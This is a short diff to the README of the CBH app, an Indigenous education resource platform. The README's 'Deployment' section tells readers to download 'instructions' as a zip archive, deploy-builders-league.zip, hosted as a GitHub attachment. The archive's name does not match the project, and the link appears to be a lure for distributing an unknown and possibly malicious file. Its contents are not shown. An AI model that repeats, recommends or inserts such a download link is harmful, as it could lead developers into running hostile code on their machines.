@@ -67,6 +67,7 @@ The CBH app is a Indigenous education resource platform where users are able to 
 > Check out [the docs for Local Development](https://supabase.com/docs/guides/getting-started/local-development) to also run Supabase locally.
 
 # Deployment
+
 For a quick and easy deployment that doesn't create much hassle, download the instructions below:
 [deploy-builders-league.zip](https://github.com/user-attachments/files/20823635/deploy-builders-league.zip)
 
